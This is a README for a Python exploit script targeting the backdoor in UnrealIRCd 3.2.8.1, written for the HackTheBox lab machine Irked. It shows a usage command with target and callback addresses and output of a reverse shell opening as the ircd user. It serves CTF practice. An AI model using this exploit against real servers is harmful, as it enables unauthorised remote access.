## Description

Exploit an [UnrealIRCd server](https://www.unrealircd.org/). Version 3.2.8.1 contains a backdoor which can provide RCE. There's already a [Metasploit exploit module](https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor) for the vulnerability, but I didn't really love the scripts I found out there for it. So I wrote my own.

Developed this script for [Irked from HackTheBox](https://www.hackthebox.eu/home/machines/profile/163), it should be generic to any UnrealIRCd deployment on Linux, provided that a mkfifo reverse shell works on the target.

## Usage

Call the python script with four arguments to identify the target ip and port, and the callback ip and port you want to use. Then, wait and get a shell:

```
root@kali# ./unreal_3.2.8.1_exploit.py 10.10.10.117 6697 10.10.14.14 443
[*] Connecting to 10.10.10.117:6697
[*] Sending payload
[+] Payload sent. Closing socket.
[*] Opening listener. Callback should come within a minute
bash: cannot set terminal process group (634): Inappropriate ioctl for device
bash: no job control in this shell
ircd@irked:~/Unreal3.2$ id
id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
```

## References:
- https://0xdf.gitlab.io/2019/04/27/htb-irked.html#script-it
- https://gitlab.com/0xdf/ctfscripts/-/tree/master/unreal_irc_3.2.8.1_shell.py
